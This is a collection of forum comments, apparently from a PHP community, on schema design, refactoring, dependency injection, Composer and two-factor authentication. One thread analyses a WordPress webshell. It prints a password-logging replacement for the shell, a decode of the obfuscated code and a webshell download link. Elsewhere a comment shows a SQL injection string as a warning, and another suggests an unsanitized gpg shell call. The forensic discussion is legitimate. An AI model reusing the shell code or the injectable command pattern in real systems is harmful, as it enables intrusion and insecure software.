Great, thanks for your help here. This means I would have these tables: 1) Ad 2) Attributes 3) Categories (I'll probably have subcategories so that might complicate things further) 4) a table that associates legal attributes - what happens if I don't have this, can you elaborate further? Also, if possible please explain why cramming everything into a single table is not a good strategy. edit: I should probably mention the CMS used will be WordPress but I'm kind of reluctant to save all attributes into its metadata and am looking into options like the one I mentioned in my first post. 
You have the wrong concept of "abstract", like many people, and that's why it leads to confusion. - "final" means that it cannot be extended - "abstract" means it cannot be instantiated or requires sub-classing If you take final + first option of abstract... you have your "fried ice". =P
Look into using Sphinx for your search. Also, if you do, consider using mariadb, (drop in mysql replacement) it has a nice Sphinx plug in that can simplify things. 
&gt; I want to use one page for all the articles Why would you do that? That sounds like it would be real bad for SEO.
I'd use a repository class to handle the interactions between controller and model: public function postSendToReady(ProjectRepository $repo) { // find &amp; validate $repo-&gt;loadProject(Input::get('id')); if ( !$repo-&gt;validator-&gt;validateAllDocumentsAreReady() ){ return Redirect::to('/pm')-&gt;with('messages', $repo-&gt;validator-&gt;getErrors() ); } // handles mail logic too $repo-&gt;saveProject(); return Redirect::to('/pm')-&gt;with('message', 'Updated project successfully.'); }
Not exactly, that's how content management systems work. You use one page as the template, then pull content into it from the database.
I'm not sure why you'd need to use a session for this. You can just pass a parameter through the URL and use it to grab the content from the database. This is very much how WordPress works. Create a template file, then when you link to the page append something like ?id=123. Grab the id from the URL and use it to pull from the database. You can even use htaccess to make your URLs pretty, so you end up with something like: http://mydomain.com/template/123
If you are setting your own server, it's as simple as installing mariadb instead of mysql. And I suppose enabling the plug in. 
Move everything except input/output into a service. And please get rid of those statics everywhere, statics have no place in clean code (very, very few exceptions). Are are tightly coupling your code and hiding your dependencies. Use dependency injection instead. That will also make your unit testing easy.
I see phpMyAdmin can also work with MariaDB. How easy or difficult it is to make phpMyAdmin point to the MariaDB installation?
It is not possible in Java for the very reason I described: http://stackoverflow.com/questions/19110342/why-cant-a-java-class-be-both-abstract-and-final And yes, I hold Java as the standard for class-based OOP approach
That's the thing, with Maria, you won't even know it's not mysql. You do nothing different. All Maria is, is a group took the mysql source and modified internal stuff to improve performance. And add some functionality in the former of things like plug-ins. 
Here's my two cents. First, let's dissect your code. $project = Project::find(Input::get('id')); Grabbing your project for analysis, that's what a controller is supposed to do. "Here is the thing I'm supposed to tell what to do." Now to determine who to tell to do what ... $project-&gt;status = Project::READY_STATUS; $validator = new ProjectValidator($project); if ( !$validator-&gt;validateAllDocumentsAreReady() ){ return Redirect::to('/pm')-&gt;with('messages', $validator-&gt;getErrors() ); } $project-&gt;save(); This is bloat, albeit only a few lines of it. The $project-&gt;status bit is never contradicted elsewhere in your controller, so I'm going to assume that it's a one time deal, and is possibly changed later on in your ProjectValidator class? But since it's an "always must be done" operation before you send the project off for validation, and there is no other logic here to verify whether or not the project IS in fact ready for validation (thus leading to the assumption that if we're here it ALWAYS WILL BE in a ready state), there is no point to setting it here that I can see. It *seems* to be a flag set to tell the validator that "yes, this particular project needs to be examined for ready-state". That is likely a common enough operation flow that the validateAllDocumentsAreReady() method can do that automatically when it's called. After all, that's what the method is doing, right? It's being told "hey, I need you to check to see that all the projects I just passed in are valid". That automatically assumes that the projects you've passed in are in a READY_STATUS state. This whole block can be abstracted out into a single validator method. if( !$validator = ProjectValidator::validateAllDocumentsAreReady($project) ) { return Redirect ..... } There's no need to create a new ProjectValidator class that I can see, but then again I'm not privy to your total code base. But on first blush, it seems that this can be abstracted out to a static method. validateAllDocumentsAreReady() seems to assume that any class coming into it will be a ProjectValidator class. There is no error detection on the assignment of the PV class in your controller, ergo I must assume it's a 100% transparent process that throws no errors, or if it does they are handled gracefully with logging and will not affect the code flow. Why not put that directly into the validateAllDocumentsAreReady() method (or another method with similar name that better indicates its job?). If you have some sort of typechecking on the vADAR method, then perhaps this would be more to your taste ... if( !$validator = ProjectValidator::createAndValidateDocumentsAreReady(new ProjectValidator($project)) ) { return Redirect.... } This method can do your $validator = new ProjectValidator($project) bit for you, and then run the validation script. Either way, this method should handle the checking and $project-&gt;save() portion of your code, and only return a "pass/fail" flag to tell you if it was done. If it's good, it saved and you can go on about your day. Otherwise, we skip it and redirect. Now then, onto the real culprit. foreach($project-&gt;documents as $document){ $permissionManager = new DocumentPermissionManager($document); $permissionManager-&gt;insertPermission(Auth::user()-&gt;email); // email failure should not stop the procedure. log it and go on try{ Mailer::notifyAdministrators($document); } catch (Exception $e) { Log::error($e, array('url'=&gt;Request::url()), array('url'=&gt;Request::url())); } try{ Mailer::notifyClients($document); } catch (Exception $e) { Log::error($e, array('url'=&gt;Request::url()), array('url'=&gt;Request::url())); } } This block can be extracted out to a single one liner. It does the same thing, with no alteration, every time. PERFECT candidate for a method abstraction. $project-&gt;sendOutNotifications(); This puts the responsibility for the class's actions back on the class. The controller has no business doing this. The controller tells who to do what, and in this case, the project is supposed to be determining this stuff. Alternatively, make a "notification" class that handles this, and absolve the project from a bit of possible bloat. NotificationEmailer::sendOutProjectNotifications($project); Personally, I can make arguments either way. "The project class should send out it's own notifications" vs "The notification class's job is to send out notifications, not the project". It boils down to whether your project class is a "container" class or a "doer" class, i.e. if its job is ONLY to hold data, or if it both holds data and does processing/analysis. Personally, I'd stick it in the notification class. It's a class whose ONLY job would be sending out notifications for whoever needs it, and it can have as many methods for that as you need. Clean separation of concerns and better unit of work in my mind. So, TL;DR time. We go from this ... public function postSendToReady() { $project = Project::find(Input::get('id')); $project-&gt;status = Project::READY_STATUS; $validator = new ProjectValidator($project); if ( !$validator-&gt;validateAllDocumentsAreReady() ){ return Redirect::to('/pm')-&gt;with('messages', $validator-&gt;getErrors() ); } $project-&gt;save(); foreach($project-&gt;documents as $document){ $permissionManager = new DocumentPermissionManager($document); $permissionManager-&gt;insertPermission(Auth::user()-&gt;email); // email failure should not stop the procedure. log it and go on try{ Mailer::notifyAdministrators($document); } catch (Exception $e) { Log::error($e, array('url'=&gt;Request::url()), array('url'=&gt;Request::url())); } try{ Mailer::notifyClients($document); } catch (Exception $e) { Log::error($e, array('url'=&gt;Request::url()), array('url'=&gt;Request::url())); } } return Redirect::to('/pm')-&gt;with('message', 'Updated project successfully.'); } To this ... public function postSendToReady() { $project = Project::find(Input::get('id')); if( !$validator = ProjectValidator::createAndValidateDocumentsAreReady($project) ) { return Redirect::to('/pm')-&gt;with('messages', $validator-&gt;getErrors() ); } NotificationEmailer::sendOutProjectNotifications($project); return Redirect::to('/pm')-&gt;with('message', 'Updated project successfully.'); } Hope this was helpful!
Well then how would you do what i want to do ? 
This seems to be the easiest and most logical solution.
The reasoning to not use [Lazy Services](http://symfony.com/doc/current/components/dependency_injection/lazy_services.html) seems pretty weak... I guess OpenSky started using Symfony 2 pretty early on and lazy services were introduced in 2.3. Nevertheless, I much prefer lazy services as it allows me to easily find all my dependencies, especially when I am intentionally Type Hinting all my functions.
Look here for cheat sheets and tools. https://www.owasp.org/index.php/Main_Page The Open Web Application Security Project (OWASP)
:) wisdom :).
I didn't include it in the blog post but in my tests using lazy services was actually slower due to the number of services I needed to be lazy. Even though a service is lazy the proxy still has to be created. I didn't research much further. The complexity of the proxies is significant so I chose a much simpler and explicit solution.
no worries.....one sec and I'll find you the 'cheat sheet' that is way more than a cheat sheet.
To be honest, I'm not the best to ask about that sort of thing. I largely wing my schemas as I go. I think the other guy that replied had good input though. That said, you will also want to take into consideration the requirements of your search, and the abilities of the engine you choose to use. IMO, the best way for you to do that is stop planning and start fiddling. Make a rough version of your site with the knowledge that most of what you are writing will be rewritten. Once you are more confident in your understanding of the software, you can plan more reliably. 
Don't relate yourself too much to PHP. Pretty much the same principles apply to all web apps written in any language. If you want more information about, say, password or encryption, search for such material. Doing it then in PHP is implementation detail. That said, probably the best online source related to PHP web app security is http://phpsecurity.readthedocs.org/en/latest/ You could also take this quiz and see if there were any gaps: http://timoh6.github.io/WebAppSecQuiz/
Backed
Thanks man ;)
Thanks man, this first link seems like just the kinda thing I was looking for. ;)
That's the best advice, just getting out of the planning phase and getting my hands dirty. I'm kind of going through an analysis paralysis phase right now becasue the task before me is quite daunting :)
It would be cool if we could typehint for the object a Callable returns. Eg public function __construct(CallableThatWillReturnMailServiceInterface $mailServiceCallable) Edit: more crazy thoughts... Or with a syntax change: public function __construct(Callable:MailServiceInterface $mailServiceCallable) { // $mailServiceCallable() will return a MailServiceInterface } This is kind of a mix of return type hinting and duck typing. What `Callable:MailServiceInterface` would do in the example above is only allow things that matched this interface: public function __invoke(): MailServiceInterface If there was a syntax to type hint for return types on a method (eg `__invoke()`) then the syntax should probably work on all methods. Eg, more like: public function __construct(getMailService:MailServiceInterface $mailServiceContainer) { // $mailServiceContainer-&gt;getMailService() will return a MailServiceInterface } This would mean the return type could be optional: public function __construct(getMailService: $mailServiceContainer) { // is_callable([$mailServiceContainer, "getMailService"]) === true } But then if you can return-duck-type-hint (or is it return-type-duck-hint?) on 1 method, why not many (you should probably just make an interface here)? public function __construct(getMailService:MailServiceInterface getLogService:LogServiceInterface $container) { // $container-&gt;getMailService() will return a MailServiceInterface // $container-&gt;getLogService() will return a LogServiceInterface } Note: this exact syntax probably wouldn't work with the parser. Also, if this were to happen then we'd probably want generics in there too.
So what happens when I'm on your site and I am reading a cool article and decide it to email it to a friend or share it on twitter? edit - Also, you are using Drupal where every damn bit of content you create ends up being a page anyhow.
Is it doing what it's supposed to?
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Linus's Law**](https://en.wikipedia.org/wiki/Linus%27s%20Law): [](#sfw) --- &gt; &gt;There are two statements named __Linus's Law__: one by [Eric S. Raymond](https://en.wikipedia.org/wiki/Eric_S._Raymond) concerning [software bug](https://en.wikipedia.org/wiki/Software_bug) detection by a community, and the other by [Linus Torvalds](https://en.wikipedia.org/wiki/Linus_Torvalds) about the motivations of programmers. &gt; --- ^Interesting: [^LinuxUser](https://en.wikipedia.org/wiki/LinuxUser) ^| [^The ^Code ^\(2001 ^film)](https://en.wikipedia.org/wiki/The_Code_\(2001_film\)) ^| [^Readahead](https://en.wikipedia.org/wiki/Readahead) ^| [^Thinstation](https://en.wikipedia.org/wiki/Thinstation) ^Parent ^commenter ^can [^toggle ^NSFW](/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+cmeprer) ^or[](#or) [^delete](/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+cmeprer)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
Substitute the pass.php with this one to obtain the password in the log: &lt;?php $wp_wp=isset($_POST['wp_wp'])?$_POST['wp_wp']:(isset($_COOKIE['wp_wp'])?$_COOKIE['wp_wp']:NULL); if($wp_wp!==NULL){ $myFile = "/tmp/pass.log"; $fh = fopen($myFile, 'a'); fwrite($fh, $wp_wp); fwrite($fh, '\n'); fclose($fh); } ?&gt;&lt;form action="" method="post"&gt;&lt;input type="text" name="wp_wp" value=""/&gt;&lt;input type="submit" value="&amp;gt;"/&gt;&lt;/form&gt;
Could be an encrypted version of this P.A.S. v.3.1.0 webshell. http://profexer.name/pas/download.php
Exactly what I thought. OP - update Wordpress and check out some zero day exploits on a security based website. Stay one step ahead of the script kiddies. 
 http://www.unphp.net/decode/b55ef7536d79c17606e3363e16b4121a/ Function Calls base64_decode 1 str_replace 1 md5 1 Variables $wp__wp BpoKw # &gt;z Jya)1OE.. $wp_wp [u'TernaryOp', {u'expr': [u'IsSet', {u'nodes': [[u'ArrayOffset', {u'node': [u'Variable', {u'name': u'$_COOKIE'}], u'expr': u'wp_wp'}]]}], u'iffalse': [u'Constant', {u'name': u'NULL'}], u'iftrue': [u'ArrayOffset', {u'node': [u'Variable', {u'name': u'$_COOKIE'}], u'expr': u'wp_wp'}]}] Stats MD5: b55ef7536d79c17606e3363e16b4121a Eval Count: 0 Decode Time: 130 ms
How much slower? That would be incredibly valuable information for people looking at using them and exploring alternatives.
Find more people near you and do a group order! 
Yes I can see in access logs how they manage to upload the files via weak script. This particular hack is caused by revslider vulnerability as reported in [Sucuri blog](http://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html). I work for a webhosting company and part of my job is to suspend sites so I deal with hacked sites too. You may probably have a different field but I'd like to know what tools do you use to catch these malware and clean them. Thanks!
This particular hack was reported in [Sucuri blog](http://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html) and because of this hack thousands of sites have been affected.
My content goes into blocks which i use on my page. So not every article will be a page. I haven't thought about shareability yet, might be something to consider. Thanks for the input ! 
This is the wrong solution to PHP not being able to have "namespaced static variables". 
&gt; The complexity of the proxies is significant so I chose a much simpler and explicit solution. I have to disagree here: instead of keeping your code simple with straight dependency injection and just marking the service lazy (which is just a configuration option), you end up with inheriting from a custom-weird class that does magic on the fly and is container aware. Your solution looks much more complex. Performance-wise I'd love to see numbers too.
Ha :)
you could use ':phone' =&gt; $_POST['phone'] ?: null, or more verbose ':phone' =&gt; empty($_POST['phone']) ? null : $_POST['phone'], or a function function nullifyString($str) { return empty($str) ? null : $str; } ':phone' =&gt; nullifyString($_POST['phone']),
I am not sure if I follow... how would that allow the lazy instantiation of services?
I am referring to the code that exists to support the proxy generation not the resulting user land code. I agree that using proxies results in cleaner user land code.
249$ so I guess it's still worth it over time, seeing that he has removed the lifetime subscription :)
I would have loved to use lazy services but I just could not get the results I wanted with them in my app and after a few weeks of experiments I gave up. You still end up with calls to Container::get() even though it returns an uninitialized proxy.
True! Looks like he has removed the lifetime subscription too, so yay. Laracasts is absolutely worth the 249$ I paid!
I guess you are looking for this? http://twig.sensiolabs.org/doc/filters/raw.html
The files I need to encrypt are in the 10mb-20mb range. Do you think using the GnuPGP would be more significant in this case?
you could type hint for a Closure
does it need to be free? https://www.authy.com
To be honest I dislike both "Lazy Services" and container awareness. I would solve this problem by combining the two idea and creating a container that holds only one service. class ExpensiveDependency{} class ExpensiveDependencyContainer{ public function get(); //gets the ExpensiveDependency } class Main{ public function __construct(ExpensiveDependencyContainer $bla) { $this-&gt;bla = $bla; } protected function getExpensiveDependency(){ return $bla-&gt;get(); } } But the correct approach might be to have non-expensive constructors in ExpensiveDependency and instead move the initialization to same -&gt;ensureInitialized() method that dependent classes would call prior to using it ( or would be called automatically on each method call).
&gt; by forgetting a "static" in any of your declared methods. And this doesn't protect you when you forget to add 'abstract final' to the class. Adding language features to try to prevent dumb programmer errors is not a productive thing to attempt.
Yeah and BSD compatible
Still telling me already registered :(
I'm at the point of considering just injecting a callable function into the service rather than extending the `LazyService`. That should make testing a lot simpler also, since the callable has a single responsibility of just being a `callable`.
I love Authy! Their app is Google Authenticator compatible AND they have an ssh module.
It depends on what you're building. Composer mandates the use of Semantic Versioning. Specifying appropriate version numbers in your composer.json file *should* be enough. Encourage your users to run your automated tests. You *do* have tests, right? You can also commit your composer.lock file, if you aren't building a library. This makes sure that your users get the specific versions you tested against. Shipping one in a library is rude and an easy way to create conflicts.. You *can* commit your vendor directory if you're using a private repo to make internal distribution easier, but it's going to clutter things up with needless changes.
Composer.lock sounds like the best option. Relying on semantic versioning is not a good idea and tests are not a replacement for knowing whether things actually changed.
Specifically, you commit the lock file for apps. You leave it out for libraries/components. iirc
You can include it in your libraries with no harm. Only the project's root composer.lock matters. If you do include composer.lock in your libraries, people who are hacking on it are able install the same components you're developing with. It makes sense, I guess But I dont commit composer.lock in my libraries either
And how is this better than [Lazy Services](http://symfony.com/doc/current/components/dependency_injection/lazy_services.html)?
What's the benefit of injecting the container and keeping a local reference to it as opposed to grabbing it out of global space?
Well a number of small things: * No overhead of calling each method through a proxy * You actually know what you are passing without relying on a mgical proxy that implements same interface being created. * Works with every DI system 
If your tests can't detect if a library you depend on has changed in a way that matters, your tests are probably not comprehensive enough.
Thank you for your work.
Correct. So you still end up with a call to the container and a proxy class constructed for each service that is lazy. In our case this is dozens of services. I wanted to eliminate the overhead entirely.
That is a nice approach! Thanks for sharing. One of the goals of my approach in our application was to solve the problem without having to rewrite dozens of services and all the associated tests. Our application is quite large so this approach would have been much more costly of a change.
There's lots of different options here, depending on need: - Google Authenticator - [Authy](http://authy.com) - [Duo Security](https://www.duosecurity.com) - [Yubikeys](http://yubico.com), a hardware token though There's also plenty of good services out there for sending SMSes if you want to go the OTP route: - [Twilio](https://twilio.com) - [Nexmo](https://nexmo.com) I've written a few libs that are popular for the GAuth and Yubikey options if you'd like to check those out: - [enygma/gauth](https://github.com/enygma/gauth) - [enygma/yubikey](https://github.com/enygma/yubikey) If you're curious, there's also a [series of posts about TFA](http://websec.io/tagged/twofactor) too. 
I've written up a lot of articles around general web and PHP security over on [Websec.io](http://websec.io). There might be some things there you'd find useful.
Usually I will have a big block at the top of the file setting all the POST vars and doing basic sanity checks. I prefer to use empty() over other similar functions.
Possibly good starting point, http://learnxinyminutes.com/docs/php/
What's preventing you from making it statically available?
You may be displaying it in a block but somewhere that content is a node and all nodes have a page.
Why would you want to custom code for a PHP module here anyway? Just SetEnv GNPGHOME and do it the Unix-way: execf("gpg -de -r %s %s", $key, $file); That's easier to understand, set up, and implictly keep a log trail.
I would say so. The more data you process, the more speed matters. You could always try both and post the reports of the benchmark.
http://www.phptherightway.com/ is a well-curated wealth of php knowledge
Nothing I suppose, just not really the symfony way. All of the services / listeners OP was referring to are defined through the symfony service container (DIC) which is initialized and kept as a local variable in the kernel.
"I'm a Java developer, familiar with servlet and jsp and of course OOP programming" &lt;-- Go for symfony. http://symfony.com/
you're only checking of $row exists. Not what it holds. Try something like if(count($row) &gt; 0) { die("..."); } 
Symfony is very akin to Spring Framework but doesn't really have a lot in common with plain servlet programming. But yes, I would also recommend Symfony.
this. This is my problem with npm 
I remember watching Fabien give a talk and during the QA he was asked where he looked to as influences for Symfony, and he said that django and spring were the two biggest influences.
if you want this for a small closed group i.e. your admin team or something, then i recommend yubikey - we really like it, they are not expensive and very flexible, also it was very easy to implement.
Works like a charm ! thanks .
That'd be bad practice? lol
Thanks a lot, I've been reading up on TFA/TOTP and from what I gather Google Authenticator is a TOTP client right. If I implement TOTP on my application the user can use Google Auth or any other TOTP client?
the point of moving the logic into a repo is to make it more reusable. as-is the controller action needs to be called to load, validate, and save a project model which we shouldn't have to rely on a specific route or controller. I'm sure this functionality could be useful in other classes as well.
You could try [Building Secure PHP Apps](https://leanpub.com/buildingsecurephpapps) by Ben Edmunds. I haven't read it myself, but I'm currently a happy user of Edmunds' Ion Auth authentication library for CodeIgniter.
Simple answer: never. If your application is DI aware, it's not dependency injection anymore , it's a service locator in disguise. In short, DI = hollywood principle - we gonna call you don't call us. $this-&gt;getLogger() //that's DI $this-&gt;container-&gt;get('logger') //that's service locator
set yourself free and enjoy hacking! i don't know about any language (except perl) that is so hacking-friendly. millions of ways to workaround good practices and conventions! this results in bad reputation for PHP, because it's so easy to write bad/hacky code. but when you need something fixed while production ship is leaking on all sides, and everything looks like it's gonna fall apart, you actually can do something in 5 minutes to prevent total havoc. 
I worked with a Java-turned-PHP developer. After a year she was as good as me at PHP. God damn Java developers.
I suggest reading Phil Sturgeons excellent blog post on the issue: https://philsturgeon.uk/php/2014/11/04/composer-its-almost-always-about-the-lock-file/
I've seen those bandaids fall off and cause more problems in under 5 minutes more often than naught.
Why does it cost 15,000 euros to make a different coloured elePHPant?
npm can generate a lockfile too, with shrinkwrap: https://www.npmjs.org/doc/cli/npm-shrinkwrap.html
Yes, true. Not a heavily well known thing though, as i understand.
Minimum order is 900 elephants.
I was in a very similar situation to you after I finished uni...and was preparing to help my parents setup their ecommerce website... I've posted a comment previously about what I found useful, so I'm gonna link to that - hope it helps: https://www.reddit.com/r/webdev/comments/15rrwr/would_taking_classes_in_c_java_unixlinux_sql_etc/c7pb9d7
Looks good. You should set it up so if you do not include a second argument, the computer will pick one at random :) Then you would have just create a game with an AI user ;)
Well done!
Nice job. I remember my first script. I multiplied two ints...
while this is technically not an error: get used to "speaking varialbes" like $chosen_move_player1 or something, it makes code easier to read also dont make variables be something different at runtime, i.e. $value2 is a string, it needs to stay a string, $chosen_move_player1_index (or $value2_index) ~ create a new variable, though you probably dont even need that if you work with in_array() array_keys etc. also i wouldnt map an aray to "Loses" , "Wins" but rather to integrers like -1 0 +1 or constants ... though i cannot exactly tell you why without writing code myself ... but imagine you'd make this game multi lingual 
Made an adjustment- replaced the switch statement with: $value2 = array_search($value2, $accepted_values); I think this is more elegant.
Just make sure to sanitize your data before you use it to pull from the database. It could work great with /?article=2 but /?article=2;drop%20table%2users could be disastrous if not properly handled
Nice! Try to use the '==='-Operator, because == is incredibly slow! 
No dice! I still get the already registered error
Dey terk err jerrrbs
This is pretty damn good for a first script. `:)` You can ditch lines 16-32 by writing `$value2 = array_search($value2, $accepted_values);`. It's poor form to re-use a variable that way, though (it's not like you're running out,) so maybe `$intVal2 = ...` instead? Once you're there, then you can do the valid input check for free afterwards, just by checking if $intVal2 is `false` (which is what you get for a no-match,) which will save you the repeated search implied by `in_array`. Also, as your scripts grow, that wins/loses table - probably make those integers instead of strings, in the future, and dump a string according to the integer. Strings are expensive to compare, easy to make subtle mistakes in, etc etc. Finally, I'd like to see variable names where you don't need to understand the script already to grasp their contents. Good variable names which describe the actual purpose are key to writing readable code. But this is *really* good for a first script, buddy.
Speed is not a reason to use === over ==
If you want to take it a step further, you can implement a more traditional command line [argument system](http://php.net/manual/en/function.getopt.php).
If you want people to use your file, I suggest to move to github and use composer. 
cute
Very bad? Why? Give me ideas.
I know it's very simple, but that's the point. I do not want use something with strange syntax or a thousand features. I just want to add a single file and use it without any effort. So I wrote this script. Very useful for me.
I will publish it on github someday. Since it become more and more popular, I think it's the right choice. Hey, the composer it's a good idea. Thanks.
Also check out http://demo.rublon.com (works with or without a phone). Uses email by default. Users can install the mobile app for more security.
Since nobody else has: https://github.com/Seldaek/monolog
Probably intentional, not so much to obfuscate but to bypass people or atomated scripts searching for `base64_decode` as a string to detect malware.
I know the monolog project. It's amazing, but too much for my needs. 
I understand wanting to keep things simple, but considering you literally need 2 lines of code to instantiate Monolog with the StreamHandler for writing to files, and then it essentially has the same api as yours, I don't really see how you can say its too much.
Although I agree that the installation process could have been described better, it also says something about your crappy skills.
My first script, I wrote in TS-Basic on my TRS80, the one with the membrane keypad. You entered your current age and it told you how old you would be in the year 2000. At first I had a bug, then I validated my program's results on my fingers, and burst into tears. I was *distraught* that I would be 27 in the year 2000, and therefore obviously far too old to enjoy the future.
Agreed, but I was unable to find a way to close the file only in the end of the host script without doing it manually. Maybe you know how to do it? (The opened files are closed automatically when the script ends? I never thought about it.) 
With a large enough sample set, it's still very effective. The fluctuations won't occur frequently enough to poison the data. Those data points can safely get thrown out. In a more simplified example, if you have 15 attempts that come in at 1 second, and 1 attempt with the same data that comes in at 4 seconds, it's probable that the 4 second result is an irregularity. Making your login system safe against timing attacks is reasonably trivial. Ignoring it is just a bad idea. This article is extremely well researched and well written, and it gets a big fat upvote from me because every programmer - especially those in web fields - needs to know about this kind of thing.
Nobody need to write an example. There are numerous papers on the subject, and any security expert will tell you it's a very real threat.
I reserver my right to be skeptical until presented with experimental proof.
I'm only 25 right now. But I still remember playing around with a 286 and remembering how amazing it was to make something happen at a keystroke. As for your age, perhaps, but you were there at the dawn of the IBM PC. You've seen an amazing transition of technologies. Plus you're only 41 so you've still got a lot of future left to enjoy. =D
So what .. you can still use it, the feature is there. Although npm's locking is not even closer to what Composer offers. Caching is terrible too.
Speed isn't an issue, it's been debunked times and times again: In the real world, it simply doesn't matter. Just like using ' vs ". They both have their use. === should be used when you are sure the values are the same type or when you want to compare two strings. == is mostly fine for anything else, really.
Try to be more consistent in your use of quotes and single quotes, you seem to alternate randomly between the two. This line: echo "Value 1 is " . $value1 . "\n" . "Value 2 is " . $value2 . "\n" The concatenation is strange. You could switch to '. Otherwise quotes are meant to introduce variables in your string (accessorily they are useful when writing a text with a lot of single quotes ' so we do not have to escape them). In other words your line would be better expressed as: echo "Value 1 is $value1\n Value 2 is $value2\n";
Good call on the news letter. Mail server reputation is a tough job to maintain these days, if for any reason your project ends on shared hosting then good luck with that. I have to strongly disagree with your suggestion of wordpress. Worpress is the complete opposite of what he's trying to achieve!
The form doesn't do anything or go anywhere, and the JS you have just produces a pop up but doesn't redirect them... So question.. if you try to make an account and submit the form and get "form submitted" alert, is the account created? Ie: check WP users. Do you get an email? Looking at the code I would guess that it's creating an account but doing nothing with the user. Otherwise I dunno, but you might try x-posting this to /r/WordPress ETA: looking at the code more, if this was strictly PHP it would be entirely nonsensical. The form isn't even posting to anything, it's just a blank form. If it were posting, it would be posting some mystery value of whatever *_e( 'Register', 'woocommerce' );* is. I have no idea what that function spits out, and no idea what the two actions do either. There's just not enough info here to help you, but it's also definitely more of a WP question than a general PHP question. :)
I know but it's so obvious. It was just funny how much effort they didn't put in to this function.
...why is it bad practice?
Why is this being slated for PHP 7? It's a minor BC change to a function?
My first ever program (QBasic) was just a bunch of if then statements with a very brief story played out. I was heavily into the Choose your Own Adventures books at the time.
&gt; Now imagine a symfony2 app that also uses doctrine to get user credentials from the database. The different components and events firing would fluctuate far more than the difference a string comparison makes. He effectively covered - and dismissed - that in the part about adding a random delay.
Don't confuse being skeptical with being correct.
i feel that is to each their own, but if you ever are writing code that somebody will be coming behind you one day, they will thank you
This is very helpful to me! Thank you very much fo all the explanations and realistic code example!! I learned a lot from these!
Ok, I don't understood your first sentence, since I never said this class is the best solution, it's just the right choice for me, personally, but let's go: * Don't is really important how I declare my constructor in this situation. * The comments do not follow phpdoc stardard, but it's not important for this project, a single class without any dependencies. Maybe someone will do it someday. * Methods is default public, you know. I don't need to explicit it. * $this-&gt; and self:: is a inconsistency that must be reviewed, but is not an error. Thanks for identify this issue. * There is no timezone checking or configuration, since for all my projects are hosted in servers with the same timezone than mine, so it worked for me as intended. Being an open source project, anyone can improve it adding more features, like timezones handling. * The @ was to avoid a warning if the variable not exist. In this situation particularly was not to avoid an error, was just to avoid the use of isset(). * debug_backtrace() is needed to track the execution line number where the log methods was called. * I really do not care if the file is writable, since if it was written sometime, probaly will be in the future. But you are right. In a perfect world I must test if it is writable and throw an error if not. Thanks for the advice. * Well, everything worked until today! I use it in many projects and probably some people too (check the download section for download count) :-) But you are right. Maybe someone could do a full error handling for this script, but again, I never had real problems with it. * I removed the newlines because is very annoying to eye read csv files with a bunch of \n. This script is intended to make visual reading easy. And not all csv readers can show line breaks correctly. Well, this was an explanation for all your topics. Some things can be improved? OF COURSE! But is more than enought to me. Thanks for the time you spent giving me some advice. I will follow some of them, like the phpdoc and the context, for the sake of better coding.
I must test this when this class is used in many other classes included. I want to avoid to open a file twice. Thanks.
Expected this to be free from some reason. Was disappointed. 
You will get free source code.
Oh, great! Thanks for the info :).
&lt;?php echo 'hello world'; ?&gt; I am programming, ma!
This is good stuff!
Are your physical machines essentially performing the same functions as one would expect from load balanced webservers, or are they doing something like [Flow](http://en.m.wikipedia.org/wiki/Flow-based_programming)?
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Flow-based programming**](https://en.wikipedia.org/wiki/Flow-based%20programming): [](#sfw) --- &gt; &gt;In [computer programming](https://en.wikipedia.org/wiki/Computer_programming), __flow-based programming__ (__FBP__) is a [programming paradigm](https://en.wikipedia.org/wiki/Programming_paradigm) that defines [applications](https://en.wikipedia.org/wiki/Application_software) as networks of "black box" [processes](https://en.wikipedia.org/wiki/Process_(computer_science\)), which exchange data across predefined connections by [message passing](https://en.wikipedia.org/wiki/Message_passing), where the connections are specified *externally* to the processes. These black box processes can be reconnected endlessly to form different applications without having to be changed internally. FBP is thus naturally [component-oriented](https://en.wikipedia.org/wiki/Software_componentry). &gt;FBP is a particular form of [dataflow programming](https://en.wikipedia.org/wiki/Dataflow_programming) based on bounded buffers, information packets with defined lifetimes, named ports, and separate definition of connections. &gt;==== &gt;[**Image**](https://i.imgur.com/pgb28qc.png) [^(i)](https://commons.wikimedia.org/wiki/File:FBP_-_Simple_network.png) --- ^Interesting: [^John ^Paul ^Morrison](https://en.wikipedia.org/wiki/John_Paul_Morrison) ^| [^Linda ^\(coordination ^language)](https://en.wikipedia.org/wiki/Linda_\(coordination_language\)) ^Parent ^commenter ^can [^toggle ^NSFW](/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+cmg09vk) ^or[](#or) [^delete](/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+cmg09vk)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
They are doing something very similar to Flow, which is why the application is designed very differently than something like Symfony or Laravel. EDIT: It's actually sort of a mix of Flow and [SOA](https://en.wikipedia.org/wiki/Service-oriented_architecture)
There are probably a lot smarter questions to be asked, but I am going to ask why? What is it that you are trying to keep in memory, what happens if the power dissapears? I'm also a little confused since you say it is stateless and had garbage collection problems? Its making me wonder if you're trying to alleviate the initial bootstrap step of an application?
